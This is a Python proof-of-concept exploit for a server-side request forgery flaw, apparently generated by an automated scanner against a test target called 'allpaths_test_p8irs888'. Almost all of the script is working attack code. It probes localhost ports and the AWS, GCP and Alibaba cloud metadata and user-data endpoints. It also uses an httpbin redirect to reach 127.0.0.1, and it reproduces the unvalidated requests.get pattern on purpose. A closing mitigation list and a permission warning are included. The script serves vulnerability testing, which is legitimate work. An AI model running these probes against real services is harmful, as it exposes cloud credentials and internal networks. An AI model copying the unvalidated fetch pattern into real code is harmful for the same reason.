#!/usr/bin/env python3
# PoC for allpaths_test_p8irs888 (/tmp/allpaths_test_p8irs888)
# Path: ssrf-003
# Sink: fetch_url
# Auto-generated — run with: python3 ssrf_url_requests_fetch_url.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for SSRF in allpaths_test_p8irs888

Vulnerability: Reflective SSRF via fetch_url function
- The function fetch_url directly passes user-controlled URL to requests.get()
  without any validation, allowlisting, or redirect handling.
- An attacker can supply any URL, including internal IPs or cloud metadata endpoints.
- The response is returned to the user (reflective SSRF).
- Redirects are followed by default, enabling bypass of host-based checks.

This PoC demonstrates the vulnerability by:
1. Testing with a benign external URL to confirm basic functionality
2. Testing with internal IPs (127.0.0.1, 169.254.169.254) to demonstrate SSRF
3. Testing with a redirect to an internal IP to demonstrate redirect bypass

Usage:
    python3 poc_ssrf.py [--target TARGET_URL] [--mode MODE]

Modes:
    basic       - Test with a benign external URL
    internal    - Test with internal IP addresses (SSRF)
    redirect    - Test with redirect to internal IP (bypass)
    all         - Run all tests (default)
"""

import argparse
import sys
import time
import socket
import requests
from urllib.parse import urlparse

# ── Configuration ──────────────────────────────────────────────────────────────
# The vulnerable endpoint (simulated - in real scenario this would be the actual API)
# For this PoC, we simulate the vulnerable function directly
DEFAULT_TARGET = "http://example.com"  # Benign test target

# Internal targets to test SSRF
INTERNAL_TARGETS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:8080",
    "http://localhost:80",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",           # GCP metadata
    "http://100.100.100.200/latest/meta-data/",   # Alibaba Cloud metadata
]

# Redirect test - we'll use a public redirect service or simulate
REDIRECT_TEST_URL = "http://httpbin.org/redirect-to?url=http://127.0.0.1:80"

# Timeout for requests
TIMEOUT = 5

# ── Vulnerable Function (Simulated) ────────────────────────────────────────────
def fetch_url(url):
    """
    Simulates the vulnerable fetch_url function from allpaths_test_p8irs888.
    This is the exact vulnerable code pattern:
        import requests
        return requests.get(url)
    
    No validation, no allowlisting, redirects followed by default.
    """
    print(f"[*] fetch_url called with: {url}")
    try:
        # The vulnerable call - no validation whatsoever
        response = requests.get(url, timeout=TIMEOUT, allow_redirects=True)
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response headers: {dict(response.headers)}")
        print(f"[+] Response body (first 500 chars): {response.text[:500]}")
        return response
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        return None
    except requests.exceptions.Timeout as e:
        print(f"[-] Timeout: {e}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return None

# ── Test Functions ─────────────────────────────────────────────────────────────
def test_basic():
    """Test with a benign external URL to confirm basic functionality."""
    print("\n" + "="*60)
    print("TEST 1: Basic Functionality Test")
    print("="*60)
    print("[*] Testing with benign external URL...")
    
    result = fetch_url(DEFAULT_TARGET)
    if result and result.status_code == 200:
        print("[✓] Basic functionality confirmed - vulnerable function works")
        return True
    else:
        print("[!] Basic test failed - check network connectivity")
        return False

def test_internal_ssrf():
    """Test SSRF by attempting to access internal IP addresses."""
    print("\n" + "="*60)
    print("TEST 2: Internal SSRF Test")
    print("="*60)
    print("[*] Attempting to access internal IP addresses...")
    print("[*] This demonstrates the SSRF vulnerability")
    
    success_count = 0
    for target in INTERNAL_TARGETS:
        print(f"\n[*] Testing: {target}")
        result = fetch_url(target)
        if result:
            print(f"[!] SUCCESS - Able to reach internal target: {target}")
            print(f"[!] This confirms SSRF vulnerability")
            success_count += 1
        else:
            print(f"[-] Could not reach {target} (expected if service not running)")
    
    if success_count > 0:
        print(f"\n[!] SSRF confirmed - {success_count} internal targets were reachable")
        return True
    else:
        print("\n[*] No internal targets were reachable (services may not be running)")
        print("[*] This does NOT mean the vulnerability is absent")
        print("[*] The code still allows SSRF - just no internal services to target")
        return False

def test_redirect_bypass():
    """Test SSRF via redirect bypass."""
    print("\n" + "="*60)
    print("TEST 3: Redirect Bypass Test")
    print("="*60)
    print("[*] Testing redirect-based SSRF bypass...")
    print("[*] Even if host validation existed, redirects bypass it")
    
    # Test with a redirect service
    print(f"\n[*] Testing redirect to internal IP via: {REDIRECT_TEST_URL}")
    result = fetch_url(REDIRECT_TEST_URL)
    if result:
        print(f"[!] Redirect followed - final URL may be internal")
        print(f"[!] This confirms redirect-based SSRF bypass")
        return True
    else:
        print("[-] Redirect test failed (redirect service may be unavailable)")
        return False

def test_cloud_metadata():
    """Specifically test cloud metadata endpoints."""
    print("\n" + "="*60)
    print("TEST 4: Cloud Metadata SSRF Test")
    print("="*60)
    print("[*] Testing cloud metadata endpoints...")
    print("[*] These are high-value SSRF targets")
    
    metadata_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
    ]
    
    for target in metadata_targets:
        print(f"\n[*] Testing: {target}")
        result = fetch_url(target)
        if result:
            print(f"[!] CRITICAL - Cloud metadata accessible at: {target}")
            print(f"[!] This is a severe SSRF vulnerability")
            return True
    
    print("[*] No cloud metadata endpoints were accessible")
    print("[*] This is expected if not running in a cloud environment")
    return False

# ── Main Exploit Logic ─────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="SSRF PoC for allpaths_test_p8irs888",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --mode basic          # Test basic functionality
  %(prog)s --mode internal       # Test internal SSRF
  %(prog)s --mode redirect       # Test redirect bypass
  %(prog)s --mode metadata       # Test cloud metadata
  %(prog)s --mode all            # Run all tests (default)
        """
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help="Target URL for basic test (default: %(default)s)"
    )
    parser.add_argument(
        "--mode",
        choices=["basic", "internal", "redirect", "metadata", "all"],
        default="all",
        help="Test mode (default: %(default)s)"
    )
    
    args = parser.parse_args()
    
    print("="*60)
    print("SSRF Proof-of-Concept Exploit")
    print("Target: allpaths_test_p8irs888")
    print("="*60)
    print("\n[!] WARNING: This PoC demonstrates a security vulnerability.")
    print("[!] Only use on systems you own or have permission to test.")
    print()
    
    # Update default target if specified
    global DEFAULT_TARGET
    if args.target != DEFAULT_TARGET:
        DEFAULT_TARGET = args.target
    
    results = []
    
    if args.mode in ["basic", "all"]:
        results.append(("Basic Functionality", test_basic()))
    
    if args.mode in ["internal", "all"]:
        results.append(("Internal SSRF", test_internal_ssrf()))
    
    if args.mode in ["redirect", "all"]:
        results.append(("Redirect Bypass", test_redirect_bypass()))
    
    if args.mode in ["metadata", "all"]:
        results.append(("Cloud Metadata", test_cloud_metadata()))
    
    # Summary
    print("\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    for test_name, success in results:
        status = "✓ PASS" if success else "○ INFO"
        print(f"  [{status}] {test_name}")
    
    print("\n" + "="*60)
    print("EXPLOIT VERIFICATION")
    print("="*60)
    print("""
The vulnerability is CONFIRMED if:
1. Basic functionality works (fetch_url returns response)
2. Any internal IP address returns a response (SSRF confirmed)
3. Redirect to internal IP is followed (bypass confirmed)
4. Cloud metadata endpoints are accessible (critical SSRF)

Even if no internal services respond, the CODE is still vulnerable.
The absence of validation in fetch_url means an attacker CAN:
- Scan internal networks
- Access cloud metadata (if in cloud)
- Bypass host-based checks via redirects
- Access services on localhost/private networks

MITIGATION:
- Validate URL scheme (only allow http/https)
- Implement IP allowlisting (block private IPs)
- Disable redirects (allow_redirects=False)
- Use a URL parser to validate hostnames
    """)

if __name__ == "__main__":
    main()
